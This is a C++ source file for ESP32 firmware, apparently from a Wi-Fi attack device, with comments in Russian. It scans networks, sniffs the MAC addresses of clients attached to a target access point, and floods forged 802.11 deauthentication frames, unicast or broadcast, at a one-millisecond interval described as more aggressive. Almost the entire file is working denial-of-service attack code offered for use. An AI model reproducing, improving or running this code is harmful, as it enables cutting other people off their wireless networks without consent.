#include "wifi_attack.h"
#include "config.h"

// --- Глобальная переменная ---
WiFiAttackManager wifiAttackManager;

// --- Статическая переменная для callback ---
static WiFiAttackManager* instance = nullptr;

WiFiAttackManager::WiFiAttackManager() 
    : sniffing_active(false), sniffing_start_time(0), sniffer_queue(nullptr),
      packets_sent(0), attack_start_time(0) {
    instance = this;
    memset(&current_attack_config, 0, sizeof(current_attack_config));
}

WiFiAttackManager::~WiFiAttackManager() {
    if (sniffer_queue) {
        vQueueDelete(sniffer_queue);
    }
    instance = nullptr;
}

bool WiFiAttackManager::init() {
    // Создание очереди для сниффера
    sniffer_queue = xQueueCreate(QUEUE_SIZE, sizeof(uint8_t[6]));
    if (sniffer_queue == NULL) {
        logMessage(LOG_ERROR, "Failed to create sniffer queue!");
        return false;
    }
    
    found_clients.reserve(MAX_CLIENTS);
    logMessage(LOG_INFO, "WiFiAttackManager initialized successfully");
    return true;
}

std::vector<WiFiNetwork> WiFiAttackManager::scanNetworks() {
    std::vector<WiFiNetwork> networks;
    
    logMessage(LOG_INFO, "Starting WiFi network scan");
    int n = WiFi.scanNetworks();
    
    if (n == -1) {
        logMessage(LOG_ERROR, "WiFi scan failed");
        return networks;
    }
    
    logMessage(LOG_INFO, "Found %d networks", n);
    networks.reserve(n);
    
    for (int i = 0; i < n; ++i) {
        networks.emplace_back(
            WiFi.SSID(i),
            WiFi.BSSIDstr(i),
            WiFi.RSSI(i),
            WiFi.channel(i),
            WiFi.encryptionType(i)
        );
    }
    
    return networks;
}

bool WiFiAttackManager::startClientSniffing(const char* ssid, const char* bssid, int channel) {
    if (!ConfigManager::isValidSSID(ssid) || !ConfigManager::isValidMacAddress(bssid) || 
        !ConfigManager::isValidChannel(channel)) {
        logMessage(LOG_ERROR, "Invalid parameters for client sniffing");
        return false;
    }
    
    // Сохранение конфигурации для сниффинга
    ConfigManager::safeStrncpy(current_attack_config.target_ssid, ssid, sizeof(current_attack_config.target_ssid));
    if (!ConfigManager::parseMac(bssid, current_attack_config.target_bssid)) {
        logMessage(LOG_ERROR, "Failed to parse BSSID for sniffing");
        return false;
    }
    current_attack_config.target_channel = channel;
    
    found_clients.clear();
    sniffing_active = true;
    sniffing_start_time = millis();
    
    WiFi.mode(WIFI_STA);
    delay(100);
    
    esp_err_t result = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (result != ESP_OK) {
        logMessage(LOG_ERROR, "Failed to set WiFi channel %d: %d", channel, result);
        sniffing_active = false;
        return false;
    }
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(snifferCallback);
    
    logMessage(LOG_INFO, "Started client sniffing on SSID %s, channel %d", ssid, channel);
    return true;
}

void WiFiAttackManager::stopClientSniffing() {
    if (!sniffing_active) return;
    
    esp_wifi_set_promiscuous(false);
    sniffing_active = false;
    WiFi.mode(WIFI_AP);
    
    logMessage(LOG_INFO, "Client sniffing stopped. Found %d clients", found_clients.size());
}

void WiFiAttackManager::processSnifferQueue() {
    if (!sniffing_active) return;
    
    // Проверка таймаута
    if (millis() - sniffing_start_time > SNIFFING_TIMEOUT_MS) {
        stopClientSniffing();
        return;
    }
    
    uint8_t client_mac[6];
    int processed_count = 0;
    const int max_process_per_loop = 5;
    
    while (processed_count < max_process_per_loop && 
           xQueueReceive(sniffer_queue, &client_mac, 0) == pdTRUE) {
        
        char mac_str[MAC_ADDRESS_LENGTH + 1];
        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X", 
                client_mac[0], client_mac[1], client_mac[2], 
                client_mac[3], client_mac[4], client_mac[5]);
        
        String mac = String(mac_str);
        
        // Проверка на дубликаты
        bool found = false;
        for (const auto& f_client : found_clients) {
            if (f_client == mac) {
                found = true;
                break;
            }
        }
        
        if (!found && found_clients.size() < MAX_CLIENTS) {
            logMessage(LOG_DEBUG, "New client discovered: %s", mac_str);
            found_clients.push_back(mac);
        } else if (found_clients.size() >= MAX_CLIENTS) {
            logMessage(LOG_WARN, "Maximum client limit reached (%d)", MAX_CLIENTS);
            break;
        }
        
        processed_count++;
    }
    
    // Проверка переполнения очереди
    UBaseType_t queue_spaces = uxQueueSpacesAvailable(sniffer_queue);
    if (queue_spaces < 2) {
        logMessage(LOG_WARN, "Sniffer queue nearly full, %d spaces remaining", queue_spaces);
    }
}

bool WiFiAttackManager::performDeauthAttack(int duration_ms, const uint8_t* client_mac) {
    if (!ConfigManager::isValidDuration(duration_ms)) {
        logMessage(LOG_ERROR, "Invalid deauth duration: %d ms", duration_ms);
        return false;
    }

    if (!validateAttackConfig()) {
        logMessage(LOG_ERROR, "Invalid attack configuration");
        return false;
    }

    resetStats();
    attack_start_time = millis();

    logMessage(LOG_INFO, "Preparing deauth attack for %d seconds", duration_ms / 1000);

    // Оптимизированное переключение в режим станции
    if (WiFi.getMode() != WIFI_STA) {
        WiFi.mode(WIFI_STA);
        delay(50); // Уменьшенная задержка
    }

    esp_err_t result = esp_wifi_set_channel(current_attack_config.target_channel, WIFI_SECOND_CHAN_NONE);
    if (result != ESP_OK) {
        logMessage(LOG_ERROR, "Failed to set WiFi channel %d: %d", current_attack_config.target_channel, result);
        return false;
    }

    uint8_t deauth_frame_template[] = {
        0xc0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00, 0x07, 0x00 // Reason code
    };

    unsigned long startTime = millis();
    unsigned long lastProgressReport = 0;
    const unsigned long progressInterval = 5000;

    if (client_mac) {
        logMessage(LOG_INFO, "Starting UNICAST deauth attack on client %02X:%02X:%02X:%02X:%02X:%02X", 
                   client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5]);
        
        uint8_t frame_to_client[sizeof(deauth_frame_template)];
        memcpy(frame_to_client, deauth_frame_template, sizeof(deauth_frame_template));
        memcpy(&frame_to_client[4], client_mac, 6);
        memcpy(&frame_to_client[10], current_attack_config.target_bssid, 6);
        memcpy(&frame_to_client[16], current_attack_config.target_bssid, 6);

        uint8_t frame_to_ap[sizeof(deauth_frame_template)];
        memcpy(frame_to_ap, deauth_frame_template, sizeof(deauth_frame_template));
        memcpy(&frame_to_ap[4], current_attack_config.target_bssid, 6);
        memcpy(&frame_to_ap[10], client_mac, 6);
        memcpy(&frame_to_ap[16], current_attack_config.target_bssid, 6);

        // Оптимизированный цикл отправки пакетов
        const unsigned long packet_interval = 1; // Уменьшенный интервал для более агрессивной атаки
        unsigned long next_packet_time = startTime;
        unsigned long next_progress_time = startTime + progressInterval;

        while(millis() - startTime < duration_ms) {
            unsigned long current_time = millis();

            if (current_time >= next_packet_time) {
                esp_err_t result1 = esp_wifi_send_pkt_freedom(frame_to_client, sizeof(frame_to_client), 0);
                esp_err_t result2 = esp_wifi_send_pkt_freedom(frame_to_ap, sizeof(frame_to_ap), 0);

                if (result1 == ESP_OK && result2 == ESP_OK) {
                    packets_sent += 2;
                }

                next_packet_time = current_time + packet_interval;
            }

            // Отчет о прогрессе
            if (current_time >= next_progress_time) {
                unsigned long elapsed = current_time - startTime;
                logMessage(LOG_INFO, "Deauth progress: %lu/%lu ms, %lu packets sent",
                          elapsed, duration_ms, packets_sent);
                next_progress_time = current_time + progressInterval;
            }

            // Микро-задержка для предотвращения блокировки watchdog
            delayMicroseconds(100);
        }
    } else {
        logMessage(LOG_INFO, "Starting BROADCAST deauth attack on AP %02X:%02X:%02X:%02X:%02X:%02X", 
                   current_attack_config.target_bssid[0], current_attack_config.target_bssid[1], 
                   current_attack_config.target_bssid[2], current_attack_config.target_bssid[3], 
                   current_attack_config.target_bssid[4], current_attack_config.target_bssid[5]);
                   
        uint8_t broadcast_frame[sizeof(deauth_frame_template)];
        memcpy(broadcast_frame, deauth_frame_template, sizeof(deauth_frame_template));
        memcpy(&broadcast_frame[10], current_attack_config.target_bssid, 6);
        memcpy(&broadcast_frame[16], current_attack_config.target_bssid, 6);

        // Оптимизированный цикл для broadcast атаки
        const unsigned long packet_interval = 1;
        unsigned long next_packet_time = startTime;
        unsigned long next_progress_time = startTime + progressInterval;

        while(millis() - startTime < duration_ms) {
            unsigned long current_time = millis();

            if (current_time >= next_packet_time) {
                esp_err_t result = esp_wifi_send_pkt_freedom(broadcast_frame, sizeof(broadcast_frame), 0);
                if (result == ESP_OK) {
                    packets_sent++;
                }
                next_packet_time = current_time + packet_interval;
            }

            if (current_time >= next_progress_time) {
                unsigned long elapsed = current_time - startTime;
                logMessage(LOG_INFO, "Deauth progress: %lu/%lu ms, %lu packets sent",
                          elapsed, duration_ms, packets_sent);
                next_progress_time = current_time + progressInterval;
            }

            delayMicroseconds(100);
        }
    }
    
    logMessage(LOG_INFO, "Deauth attack completed. Total packets sent: %lu", packets_sent);
    return true;
}

unsigned long WiFiAttackManager::getAttackDuration() const {
    if (attack_start_time == 0) return 0;
    return millis() - attack_start_time;
}

const char* WiFiAttackManager::getEncryptionTypeStr(wifi_auth_mode_t type) {
    switch (type) {
        case WIFI_AUTH_OPEN: return "OPEN";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA_PSK";
        case WIFI_AUTH_WPA2_PSK: return "WPA2_PSK";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2_ENT";
        default: return "UNKNOWN";
    }
}

void WiFiAttackManager::snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!instance || !instance->sniffing_active) return;

    wifi_ieee80211_packet_t* pkt = (wifi_ieee80211_packet_t*)buf;
    wifi_ieee80211_mac_hdr_t* hdr = &pkt->hdr;

    uint8_t* bssid = nullptr;
    uint8_t* client_mac = nullptr;

    bool toDS = (hdr->frame_ctrl & 0x0100) != 0;
    bool fromDS = (hdr->frame_ctrl & 0x0200) != 0;

    if (type == WIFI_PKT_DATA) {
        if (toDS && !fromDS) {
            bssid = hdr->addr1;
            client_mac = hdr->addr2;
        } else if (!toDS && fromDS) {
            bssid = hdr->addr2;
            client_mac = hdr->addr1;
        }
    } else if (type == WIFI_PKT_MGMT) {
        if (memcmp(hdr->addr3, instance->current_attack_config.target_bssid, 6) == 0) {
            if (memcmp(hdr->addr2, instance->current_attack_config.target_bssid, 6) != 0) {
                client_mac = hdr->addr2;
            }
            else if (memcmp(hdr->addr1, instance->current_attack_config.target_bssid, 6) != 0 &&
                     memcmp(hdr->addr1, (uint8_t*)"\xff\xff\xff\xff\xff\xff", 6) != 0) {
                client_mac = hdr->addr1;
            }
            bssid = hdr->addr3;
        }
    }

    if (bssid && client_mac &&
        memcmp(bssid, instance->current_attack_config.target_bssid, 6) == 0) {
        // Отправляем MAC в очередь
        xQueueSend(instance->sniffer_queue, client_mac, 0);
    }
}

void WiFiAttackManager::resetStats() {
    packets_sent = 0;
    attack_start_time = 0;
}

bool WiFiAttackManager::validateAttackConfig() {
    if (!ConfigManager::isValidSSID(current_attack_config.target_ssid)) {
        return false;
    }

    if (!ConfigManager::isValidChannel(current_attack_config.target_channel)) {
        return false;
    }

    // Проверка BSSID (не должен быть нулевым)
    bool bssid_valid = false;
    for (int i = 0; i < 6; i++) {
        if (current_attack_config.target_bssid[i] != 0) {
            bssid_valid = true;
            break;
        }
    }

    return bssid_valid;
}
